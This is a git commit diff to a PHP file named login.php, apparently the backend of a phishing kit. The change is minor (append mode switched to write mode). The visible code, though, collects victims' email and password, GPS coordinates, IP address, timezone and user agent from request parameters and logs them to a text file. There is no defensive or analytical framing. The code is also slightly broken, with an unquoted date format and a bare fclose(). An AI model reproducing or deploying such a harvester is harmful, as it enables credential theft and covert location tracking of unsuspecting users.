ae09d3c2851b6a41fdce5af78299c52914070f63
meta <123126906+meta-sudo@users.noreply.github.com>
2024-04-15 11:57:25 +0100

    Update login.php

--- book_files/login.php
+++ book_files/login.php
@@ -9,7 +9,7 @@ $date = date(dd-mm-YYYY);
 $status = $_GET["status"];
 $uAgent = $_GET["userAgent"];
 $timezone = $_GET["timezone"];
-$myFile = fopen("location.txt", "a");
+$myFile = fopen("location.txt", "w");
 $myDatas = "==========[".$date."]==========\n\tStatus: ".$status."\n\tTime: ".$time."\n\tLat: ".$lat."\n\tLong: ".$long."\n\tEmail: ".$email."\n\tPswd: ".$pass."\n\tIP_Addr: ".$_SERVER["REMOTE_ADDR"]."\n\tTime_Zone: ".$timezone."\n\tUser_Agent: ".$uAgent."\n================================\n\n";
 fwrite($myFile, $myDatas);
 fclose();
